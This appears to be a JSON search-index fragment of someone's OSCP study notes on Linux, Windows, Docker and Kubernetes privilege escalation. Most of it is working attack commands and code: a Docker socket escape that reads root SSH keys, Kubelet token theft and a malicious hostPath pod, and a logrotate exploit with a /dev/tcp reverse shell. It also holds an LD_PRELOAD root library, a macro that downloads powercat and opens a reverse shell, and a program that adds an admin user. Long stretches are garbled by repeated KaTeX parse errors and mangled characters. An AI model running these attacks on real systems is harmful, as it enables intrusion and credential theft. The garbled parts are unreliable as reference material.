/mnt bash # ‚úÖ If Docker socket exposed (inside container) ls -al /app/docker.sock # or /var/run/docker.sock # ‚úÖ If Docker binary missing inside container, upload it wget https://\u003cattacker-ip\u003e:443/docker -O docker chmod +x docker # ‚úÖ List running containers via docker socket inside container /tmp/docker -H unix:///app/docker.sock ps # ‚úÖ Launch new privileged container mounting host filesystem inside container /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app # ‚úÖ Get shell inside new privileged container /tmp/docker -H unix:///app/docker.sock exec -it \u003ccontainer-id\u003e /bin/bash # ‚úÖ Navigate to host filesystem from inside privileged container cd /hostsystem # ‚úÖ Extract private keys from host (example) cat /hostsystem/root/.ssh/id_rsa Kubernetes (K8s) Summary for Pentesting Overview Kubernetes (K8s) is an open-source container orchestration platform. Developed by Google; now under Cloud Native Computing Foundation. Manages deployment, scaling, and management of containerized applications. Provides features like:\n- Load balancing\n- Service discovery\n- Storage orchestration\n- Self-healing\n- RBAC (Role-Based Access Control)\n- Network Policies\n- Security Contexts Kubernetes Architecture Control Plane (Master Node) Responsible for managing the cluster:\nComponent Port etcd 2379, 2380 API server 6443 Scheduler 10251 Controller Manager 10252 Kubelet API 10250 Read-Only Kubelet API 10255 Worker Nodes (Minions) Run containerized apps. Receive instructions from the Control Plane. Execute workloads. Key Concepts Pods: Smallest deployable units (can contain one or more containers). Namespaces: Logical separation of cluster resources. API Resources: Pods, Services, Deployments, etc. Kubernetes vs Docker Function Docker Kubernetes Purpose Container platform Container orchestration Scaling Manual Automatic Networking Simple Complex w/ policies Storage Volumes Multiple storage options Kubernetes API API server handles all requests (kubectl, REST, etc.). Supports declarative configuration. REST operations: GET, POST, PUT, PATCH, DELETE. Authentication Supports:\n- Client certificates\n- Bearer tokens\n- Authenticating proxy\n- HTTP basic auth Uses RBAC for authorization. Anonymous Access By default, Kubelet allows anonymous access. Anonymous requests are unauthenticated:\n```bash\ncurl https://:6443 -k\nKubelet API Pentesting\nExtracting Pods via Kubelet API\nbash\nCopy\nEdit\ncurl https://:10250/pods -k | jq .\nOutput includes pod names, namespaces, containers, configs, and secrets. Extracting Pods via kubeletctl\nbash\nCopy\nEdit\nkubeletctl -i ‚Äìserver pods\nScanning for RCE\nbash\nCopy\nEdit\nkubeletctl -i ‚Äìserver scan rce\nExample Output:\nNode IP PODS Namespace Containers RCE\n10.129.10.11 nginx default nginx +\netcd-steamcloud kube-system etcd -\nGaining Shell Access (if vulnerable to RCE)\nbash\nCopy\nEdit\nkubeletctl -i ‚Äìserver exec ‚Äúid‚Äù -p nginx -c nginx\nIf output: uid=0(root) gid=0(root), container is running as root.\nPrivilege Escalation\nExtracting Service Account Token\nbash\nCopy\nEdit\nkubeletctl -i ‚Äìserver exec ‚Äúcat /var/run/secrets/kubernetes.io/serviceaccount/token‚Äù -p nginx -c nginx | tee -a k8.token\nExtracting CA Certificate\nbash\nCopy\nEdit\nkubeletctl ‚Äìserver exec ‚Äúcat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt‚Äù -p nginx -c nginx | tee -a ca.crt\nChecking Permissions\nbash\nCopy\nEdit\nexport token=cat k8.token\nkubectl ‚Äìtoken=$token ‚Äìcertificate-authority=ca.crt ‚Äìserver=https://:6443 auth can-i ‚Äìlist If allowed to create pods, create a malicious pod: privesc.yaml yaml Copy Edit apiVersion: v1 kind: Pod metadata: name: privesc namespace: default spec: containers: - name: privesc image: nginx:1.14.2 volumeMounts: - mountPath: /root name: mount-root-into-mnt volumes: - name: mount-root-into-mnt hostPath: path: / automountServiceAccountToken: true hostNetwork: true Deploy the pod bash Copy Edit kubectl ‚Äìtoken=$\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò\u0026‚Äô at position 55: ‚Ä¶server=https://\u0026Ã≤lt;k8s-api-ip\u0026g‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò\u0026‚Äô at position 55: ‚Ä¶server=https://\u0026Ã≤lt;k8s-api-ip\u0026g‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò\u0026‚Äô at position 55: ‚Ä¶server=https://\u0026Ã≤lt;k8s-api-ip\u0026g‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò\u0026‚Äô at position 55: ‚Ä¶server=https://\u0026Ã≤lt;k8s-api-ip\u0026g‚Ä¶\ntoken ‚Äìcertificate-authority=ca.crt ‚Äìserver=https://:6443 apply -f privesc.yaml\nVerify running pods\nbash\nCopy\nEdit\nkubectl ‚Äìtoken=$token ‚Äìcertificate-authority=ca.crt ‚Äìserver=https://:6443 get pods\nExtract Host Files (e.g., SSH key)\nbash\nCopy\nEdit\nkubeletctl ‚Äìserver exec ‚Äúcat /root/root/.ssh/id_rsa‚Äù -p privesc -c privesc\nSummary\nKubernetes pentesting often revolves around gaining access to Kubelet or API server.\nKubelet API is a key attack surface.\nPrivilege escalation can be performed via pod creation and hostPath mounts.\nService account tokens and certificates are valuable assets for lateral movement.\nExploiting Logrotate (Privilege Escalation) Conditions for exploitation: Writable log file.\nlogrotate runs as root.\nVulnerable versions:\n3.8.6\n3.11.0\n3.15.0\n3.18.0\nExploit: logrotten Download \u0026 Compile: bash\nCopyEdit\ngit clone https://github.com/whotwagner/logrotten.gitcd logrottengcc logrotten.c -o logrotten\nPrepare payload (example: reverse shell): bash\nCopyEdit\necho 'bash -i \u003e\u0026 /dev/tcp/10.10.14.2/9001 0\u003e\u00261' \u003e payload\nCheck create or compress option(method used by logrotate): bash\nCopyEdit\ngrep \"create\\|compress\" /etc/logrotate.conf | grep -v \"#\"\nStart listener on attack box: bash\nCopyEdit\nnc -nlvp 9001\nRun the exploit: bash\nCopyEdit\n./logrotten -p ./payload /tmp/tmp.log\nOn listener (attacker machine): bash\nCopyEdit\n# iduid=0(root) gid=0(root) groups=0(root)\nLD_PRELOAD Privilege Escalation Let‚Äôs see an example of how we can utilize the LD_PRELOAD environment variable to escalate privileges. For this, we need a user with sudo privileges.\nShared Libraries\nlocal_student@NIX02:~$ sudo -l Matching Defaults entries for daniel.carter on NIX02: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, env_keep+=LD_PRELOAD User daniel.carter may run the following commands on NIX02: (root) NOPASSWD: /usr/sbin/apache2 restart This user has rights to restart the Apache service as root, but since this is NOT a GTFOBin and the /etc/sudoers entry is written specifying the absolute path, this could not be used to escalate privileges under normal circumstances. However, we can exploit the LD_PRELOAD issue to run a custom shared library file. Let‚Äôs compile the following library:\nCode: c\n#include \u003cstdio.h\u003e #include \u003csys/types.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e void _init() { unsetenv(\"LD_PRELOAD\"); setgid(0); setuid(0); system(\"/bin/bash\"); } We can compile this as follows:\nShared Libraries\nlocal_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles Finally, we can escalate privileges using the below command. Make sure to specify the full path to your malicious library file.\nShared Libraries\nlocal_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart id uid=0(root) gid=0(root) groups=0(root)",
    "description": "File Systems \u0026 Additional Drives Introduction to Linux Privilege Escalation\ncube111@local[/local]$ lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 30G 0 disk ‚îú‚îÄsda1 8:1 0 29G 0 part / ‚îú‚îÄsda2 8:2 0 1K 0 part ‚îî‚îÄsda5 8:5 0 975M 0 part [SWAP] sr0 11:0 1 848M 0 rom Find Writable Directories Introduction to Linux Privilege Escalation\ncube111@local[/local]$ find / -path /proc -prune -o -type d -perm -o+w 2\u003e/dev/null /dmz-backups /tmp /tmp/VMwareDnD /tmp/.",
    "tags": [],
    "title": "linux privilege escalation",
    "uri": "/oscp-notes/linux-privilege-escalation/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "Windows Privilege Escalation Abusing Windows group privileges Abusing Windows user privileges Bypassing User Account Control Abusing weak service/file permissions Leveraging unpatched kernel exploits Credential theft Traffic Capture and more. MACROS\ngo to tools‚Äì\u003emacros‚Äì\u003eoraganise macros‚Äî\u003ebasic‚Äî\u003eclick on untitled‚Äî\u003enew‚Äî\u003eshell commands\nthen save it as .odt\nSub Main Shell(\"cmd /c powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.234/powercat.ps1');powercat -c 192.168.45.169 -p 4444 -e powershell\") End Sub SERvice binary hijacking\n#include int main () { int i; i = system (‚Äúnet user dave2 password123! /add‚Äù); i = system (‚Äúnet localgroup administrators dave2 /add‚Äù); ret\nkali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe\nDLL hijacking\nDownload the binary in ypur pc\nrun procmon\n16.3.1 Scheduled Tasks\nschtasks /query /fo LIST /v | Where-Object {\n$_ -match ‚Äú^Task To Run:‚Äù -and $¬†_ -notmatch ‚Äú\\\\Windows‚Äù -and\n$_ -notmatch ‚Äú\\\\System32‚Äù -and $¬†_ -notmatch ‚Äú\\\\Program Files‚Äù -and\n$_ -notmatch ‚Äú\\\\ProgramData‚Äù -and $¬†_ -notmatch ‚Äú\\\\Users\\\\Default‚Äù -and\n$_ -notmatch ‚Äú\\\\Users\\\\Administrator‚Äù\n}\nschtasks /query /fo LIST /v | Where-Object { $_ -match ‚Äú^Task To Run:‚Äù -and $_ -notmatch ‚Äú\\\\Windows\\\\System32‚Äù -and $_ -notmatch ‚Äú\\\\Windows‚Äù -and $_ -notmatch ‚Äú\\\\Program Files‚Äù -and $_ -notmatch ‚Äú\\\\ProgramData‚Äù -and $_ -notmatch ‚Äú\\\\Users\\\\Default‚Äù -and $_ -notmatch ‚Äú\\\\Users\\\\Administrator‚Äù }\nschtasks /query /fo LIST /v | Where-Object { $_ -match \"^Task To Run:\" -and $_ -notmatch \"\\\\Windows\\\\System32\" -and $_ -notmatch \"\\\\Windows\" -and $_ -notmatch \"\\\\Program Files\" -and $_ -notmatch \"\\\\ProgramData\" -and $_ -notmatch \"\\\\Users\\\\Default\" -and $_ -notmatch \"\\\\Users\\\\Administrator\" } PS C:\\Users\\shaik\u003e schtasks /query /fo LIST /v | Where-Object {$_ -match ‚Äú^Task To Run:‚Äù} | Where-Object {$\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 25: ‚Ä¶\"^Task To Run:\"}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 25: ‚Ä¶\"^Task To Run:\"}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 25: ‚Ä¶\"^Task To Run:\"}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 25: ‚Ä¶\"^Task To Run:\"}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 25: ‚Ä¶\"^Task To Run:\"}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 25: ‚Ä¶\"^Task To Run:\"}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 25: ‚Ä¶\"^Task To Run:\"}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 25: ‚Ä¶\"^Task To Run:\"}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 25: ‚Ä¶\"^Task To Run:\"}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 25: ‚Ä¶\"^Task To Run:\"}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 25: ‚Ä¶\"^Task To Run:\"}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 25: ‚Ä¶\"^Task To Run:\"}Ã≤ | Where-Object‚Ä¶\n_ -notmatch ‚Äú\\\\Windows‚Äù} | Where-Object {$_ -notmatch ‚Äú\\\\System32‚Äù} | Where-Object {$\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 27: ‚Ä¶ ‚Äú\\\\\\\\System32‚Äù}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 27: ‚Ä¶ ‚Äú\\\\\\\\System32‚Äù}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 27: ‚Ä¶ ‚Äú\\\\\\\\System32‚Äù}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 27: ‚Ä¶ ‚Äú\\\\\\\\System32‚Äù}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 27: ‚Ä¶ ‚Äú\\\\\\\\System32‚Äù}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 27: ‚Ä¶ ‚Äú\\\\\\\\System32‚Äù}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 27: ‚Ä¶ ‚Äú\\\\\\\\System32‚Äù}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 27: ‚Ä¶ ‚Äú\\\\\\\\System32‚Äù}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 27: ‚Ä¶ ‚Äú\\\\\\\\System32‚Äù}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 27: ‚Ä¶ ‚Äú\\\\\\\\System32‚Äù}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 27: ‚Ä¶ ‚Äú\\\\\\\\System32‚Äù}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 27: ‚Ä¶ ‚Äú\\\\\\\\System32‚Äù}Ã≤ | Where-Object‚Ä¶\n_ -notmatch ‚Äú\\\\Program Files‚Äù} | Where-Object {$_ -notmatch ‚Äú\\\\ProgramData‚Äù} | Where-Object {$\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 30: ‚Ä¶\\\\\\ProgramData\"}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 30: ‚Ä¶\\\\\\ProgramData\"}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 30: ‚Ä¶\\\\\\ProgramData\"}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 30: ‚Ä¶\\\\\\ProgramData\"}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 30: ‚Ä¶\\\\\\ProgramData\"}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 30: ‚Ä¶\\\\\\ProgramData\"}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 30: ‚Ä¶\\\\\\ProgramData\"}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 30: ‚Ä¶\\\\\\ProgramData\"}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 30: ‚Ä¶\\\\\\ProgramData\"}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 30: ‚Ä¶\\\\\\ProgramData\"}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 30: ‚Ä¶\\\\\\ProgramData\"}Ã≤ | Where-Object‚Ä¶\nKaTeX parse error: Expected ‚ÄòEOF‚Äô, got ‚Äò}‚Äô at position 30: ‚Ä¶\\\\\\ProgramData\"}Ã≤ | Where-Object‚Ä¶\n_ -notmatch ‚Äú\\\\Users\\\\Default‚Äù} | Where-Object {$_ -notmatch ‚Äú\\\\Users\\\\Administrator‚Äù}\nUseful Tools There are many tools available to us to assist with enumerating Windows systems for common and obscure privilege escalation vectors. Below is a list of useful binaries and scripts, many of which we will cover within the coming module sections.\nTool Description Seatbelt C# project for performing a wide variety of local privilege escalation checks winPEAS WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained here PowerUp PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found SharpUp C# version of PowerUp JAWS PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0 SessionGopher SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information Watson Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities. LaZagne Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more Windows Exploit Suggester - Next Generation WES-NG is a tool based on the output of Windows‚Äô systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported Sysinternals Suite We will use several tools from Sysinternals in our enumeration including AccessChk, PipeList, and PsService We can also find pre-compiled binaries of Seatbelt and SharpUp here, and standalone binaries of LaZagne here. It is recommended that we always compile our tools from the source if using them in a client environment.\nSituational Awareness Interface(s), IP Address(es), DNS Information Situational Awareness\nC:\\local\u003e ipconfig /all Windows IP Configuration Host Name . . . . . . . . . . . . : WINLPE-SRV01 Primary Dns Suffix . . . . . . . : Node Type . . . . . . . . . . . . : Hybrid IP Routing Enabled. . . . . . . . : No WINS Proxy Enabled. . . . . . . . : No DNS Suffix Search List. . . . . . : .local Ethernet adapter Ethernet1: Connection-specific DNS Suffix . : Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter Physical Address. . . . . . . . . : 00-50-56-B9-C5-4B DHCP Enabled. . . . . . . . . . . : No Autoconfiguration Enabled . . . . : Yes Link-local IPv6 Address . . . . . : fe80::f055:fefd:b1b:9919%9(Preferred) IPv4 Address. . . . . . . . . . . : 192.168.20.56(Preferred) Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 192.168.20.1 DHCPv6 IAID . . . . . . . . . . . : 151015510 DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-27-ED-DB-68-00-50-56-B9-90-94 DNS Servers . . . . . . . . . . . : 8.8.8.8 NetBIOS over Tcpip. . . . . . . . : Enabled Ethernet adapter Ethernet0: Connection-specific DNS Suffix . : .local Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection Physical Address. . . . . . . . . : 00-50-56-B9-90-94 DHCP Enabled. . . . . . . . . . . : Yes Autoconfiguration Enabled . . . . : Yes IPv6 Address. . . . . . . . . . . : dead:beef::e4db:5ea3:2775:8d4d(Preferred) Link-local IPv6 Address . . . . . : fe80::e4db:5ea3:2775:8d4d%4(Preferred) IPv4 Address. . . . . . . . . . . : 10.129.43.8(Preferred) Subnet Mask . . . . . . . . . . . : 255.255.0.0 Lease Obtained. . . . . . . . . . : Thursday, March 25, 2021 9:24:45 AM Lease Expires . . . . . . . . . . : Monday, March 29, 2021 1:28:44 PM Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:4ddf%4 10.129.0.1 DHCP Server . . . . . . . . . . . : 10.129.0.1 DHCPv6 IAID . . . . . . . . . . . : 50352214 DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-27-ED-DB-68-00-50-56-B9-90-94 DNS Servers . . . . . . . . . . . : 1.1.1.1 8.8.8.8 NetBIOS over Tcpip. . . . . . . . : Enabled Tunnel adapter isatap..local: Media State . . . . . . . . . . . : Media disconnected Connection-specific DNS Suffix . : .local Description . . . . . . . . . . . : Microsoft ISATAP Adapter Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0 DHCP Enabled. . . . . . . . . . . : No Autoconfiguration Enabled . . . . : Yes Tunnel adapter Teredo Tunneling Pseudo-Interface: Media State . . . . . . . . . . . : Media disconnected Connection-specific DNS Suffix . : Description . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0 DHCP Enabled. . . . . . . . . . . : No Autoconfiguration Enabled . . . . : Yes Tunnel adapter isatap.{02D6F04C-A625-49D1-A85D-4FB454FBB3DB}: Media State . . . . . . . . . . . : Media disconnected Connection-specific DNS Suffix . : Description . . . . . . . . . . . : Microsoft ISATAP Adapter #2 Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0 DHCP Enabled. . . . . . . . . . . : No Autoconfiguration Enabled . . . . : Yes ARP Table Situational Awareness\nC:\\local\u003e arp -a Interface: 10.129.43.8 --- 0x4 Internet Address Physical Address Type 10.129.0.1 00-50-56-b9-4d-df dynamic 10.129.43.12 00-50-56-b9-da-ad dynamic 10.129.43.13 00-50-56-b9-5b-9f dynamic 10.129.255.255 ff-ff-ff-ff-ff-ff static 224.0.0.22 01-00-5e-00-00-16 static 224.0.0.252 01-00-5e-00-00-fc static 224.0.0.253 01-00-5e-00-00-fd static 239.255.255.250 01-00-5e-7f-ff-fa static 255.255.255.255 ff-ff-ff-ff-ff-ff static Interface: 192.168.20.56 --- 0x9 Internet Address Physical Address Type 192.168.20.255 ff-ff-ff-ff-ff-ff static 224.0.0.22 01-00-5e-00-00-16 static 224.0.0.252 01-00-5e-00-00-fc static 239.255.255.250 01-00-5e-7f-ff-fa static 255.255.255.255 ff-ff-ff-ff-ff-ff static Routing Table Situational Awareness\nC:\\local\u003e route print =========================================================================== Interface List 9...00 50 56 b9 c5 4b ......vmxnet3 Ethernet Adapter 4...00 50 56 b9 90 94 ......Intel(R) 82574L Gigabit Network Connection 1...........................Software Loopback Interface 1 3...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter 5...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface 13...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #2 =========================================================================== IPv4 Route Table =========================================================================== Active Routes: Network Destination Netmask Gateway Interface Metric 0.0.0.0 0.0.0.0 10.129.0.1 10.129.43.8 25 0.0.0.0 0.0.0.0 192.168.20.1 192.168.20.56 271 10.129.0.0 255.255.0.0 On-link 10.129.43.8 281 10.129.43.8 255.255.255.255 On-link 10.129.43.8 281 10.129.255.255 255.255.255.255 On-link 10.129.43.8 281 127.0.0.0 255.0.0.0 On-link 127.0.0.1 331 127.0.0.1 255.255.255.255 On-link 127.0.0.1 331 127.255.255.255 255.255.255.255 On-link 127.0.0.1 331 192.168.20.0 255.255.255.0 On-link 192.168.20.56 271 192.168.20.56 255.255.255.255 On-link 192.168.20.56 271 192.168.20.255 255.255.255.255 On-link 192.168.20.56 271 224.0.0.0 240.0.0.0 On-link 127.0.0.1 331 224.0.0.0 240.0.0.0 On-link 10.129.43.8 281 224.0.0.0 240.0.0.0 On-link 192.168.20.56 271 255.255.255.255 255.255.255.255 On-link 127.0.0.1 331 255.255.255.255 255.255.255.255 On-link 10.129.43.8 281 255.255.255.255 255.255.255.255 On-link 192.168.20.56 271 =========================================================================== Persistent Routes: Network Address Netmask Gateway Address Metric 0.0.0.0 0.0.0.0 192.168.20.1 Default =========================================================================== IPv6 Route Table =========================================================================== Active Routes: If Metric Network Destination Gateway 4 281 ::/0 fe80::250:56ff:feb9:4ddf 1 331 ::1/128 On-link 4 281 dead:beef::/64 On-link 4 281 dead:beef::e4db:5ea3:2775:8d4d/128 On-link 4 281 fe80::/64 On-link 9 271 fe80::/64 On-link 4 281 fe80::e4db:5ea3:2775:8d4d/128 On-link 9 271 fe80::f055:fefd:b1b:9919/128 On-link 1 331 ff00::/8 On-link 4 281 ff00::/8 On-link 9 271 ff00::/8 On-link =========================================================================== Persistent Routes: None Check Windows Defender Status Situational Awareness\nPS C:\\local\u003e Get-MpComputerStatus AMEngineVersion : 1.1.17900.7 AMProductVersion : 4.10.14393.2248 AMServiceEnabled : True AMServiceVersion : 4.10.14393.2248 AntispywareEnabled : True AntispywareSignatureAge : 1 AntispywareSignatureLastUpdated : 3/28/2021 2:59:13 AM AntispywareSignatureVersion : 1.333.1470.0 AntivirusEnabled : True AntivirusSignatureAge : 1 AntivirusSignatureLastUpdated : 3/28/2021 2:59:12 AM AntivirusSignatureVersion : 1.333.1470.0 BehaviorMonitorEnabled : False ComputerID : 54AF7DE4-3C7E-4DA0-87AC-831B045B9063 ComputerState : 0 FullScanAge : 4294967295 FullScanEndTime : FullScanStartTime : IoavProtectionEnabled : False LastFullScanSource : 0 LastQuickScanSource : 0 NISEnabled : False NISEngineVersion : 0.0.0.0 NISSignatureAge : 4294967295 NISSignatureLastUpdated : NISSignatureVersion : 0.0.0.0 OnAccessProtectionEnabled : False QuickScanAge : 4294967295 QuickScanEndTime : QuickScanStartTime : RealTimeProtectionEnabled : False RealTimeScanDirection : 0 PSComputerName : List AppLocker Rules Situational Awareness\nPS C:\\local\u003e Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections PublisherConditions : {*\\*\\*,0.0.0.0-*} PublisherExceptions : {} PathExceptions : {} HashExceptions : {} Id : a9e18c21-ff8f-43cf-b9fc-db40eed693ba Name : (Default Rule) All signed packaged apps Description : Allows members of the Everyone group to run packaged apps that are signed. UserOrGroupSid : S-1-1-0 Action : Allow PathConditions : {%PROGRAMFILES%\\*} PathExceptions : {} PublisherExceptions : {} HashExceptions : {} Id : 921cc481-6e17-4653-8f75-050b80acca20 Name : (Default Rule) All files located in the Program Files folder Description : Allows members of the Everyone group to run applications that are located in the Program Files folder. UserOrGroupSid : S-1-1-0 Action : Allow PathConditions : {%WINDIR%\\*} PathExceptions : {} PublisherExceptions : {} HashExceptions : {} Id : a61c8b2c-a319-4cd0-9690-d2177cad7b51 Name : (Default Rule) All files located in the Windows folder Description : Allows members of the Everyone group to run applications that are located in the Windows folder. UserOrGroupSid : S-1-1-0 Action : Allow PathConditions : {*} PathExceptions : {} PublisherExceptions : {} HashExceptions : {} Id : fd686d83-a829-4351-8ff4-27c7de5755d2 Name : (Default Rule) All files Description : Allows members of the local Administrators group to run all applications. UserOrGroupSid : S-1-5-32-544 Action : Allow PublisherConditions : {*\\*\\*,0.0.0.0-*} PublisherExceptions : {} PathExceptions : {} HashExceptions : {} Id : b7af7102-efde-4369-8a89-7a6a392d1473 Name : (Default Rule) All digitally signed Windows Installer files Description : Allows members of the Everyone group to run digitally signed Windows Installer files. UserOrGroupSid : S-1-1-0 Action : Allow PathConditions : {%WINDIR%\\Installer\\*} PathExceptions : {} PublisherExceptions : {} HashExceptions : {} Id : 5b290184-345a-4453-b184-45305f6d9a54 Name : (Default Rule) All Windows Installer files in %systemdrive%\\Windows\\Installer Description : Allows members of the Everyone group to run all Windows Installer files located in %systemdrive%\\Windows\\Installer. UserOrGroupSid : S-1-1-0 Action : Allow PathConditions : {*.*} PathExceptions : {} PublisherExceptions : {} HashExceptions : {} Id : 64ad46ff-0d71-4fa0-a30b-3f3d30c5433d Name : (Default Rule) All Windows Installer files Description : Allows members of the local Administrators group to run all Windows Installer files. UserOrGroupSid : S-1-5-32-544 Action : Allow PathConditions : {%PROGRAMFILES%\\*} PathExceptions : {} PublisherExceptions : {} HashExceptions : {} Id : 06dce67b-934c-454f-a263-2515c8796a5d Name : (Default Rule) All scripts located in the Program Files folder Description : Allows members of the Everyone group to run scripts that are located in the Program Files folder. UserOrGroupSid : S-1-1-0 Action : Allow PathConditions : {%WINDIR%\\*} PathExceptions : {} PublisherExceptions : {} HashExceptions : {} Id : 9428c672-5fc3-47f4-808a-a0011f36dd2c Name : (Default Rule) All scripts located in the Windows folder Description : Allows members of the Everyone group to run scripts that are located in the Windows folder. UserOrGroupSid : S-1-1-0 Action : Allow PathConditions : {*} PathExceptions : {} PublisherExceptions : {} HashExceptions : {} Id : ed97d0cb-15ff-430f-b82c-8d7832957725 Name : (Default Rule) All scripts Description : Allows members of the local Administrators group to run all scripts. UserOrGroupSid : S-1-5-32-544 Action : Allow Test AppLocker Policy Situational Awareness\nPS C:\\local\u003e Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\\Windows\\System32\\cmd.exe -User Everyone FilePath PolicyDecision MatchingRule -------- -------------- ------------ C:\\Windows\\System32\\cmd.exe Denied c:\\windows\\system32\\cmd.exe Initial Enumeration Tasklist Initial 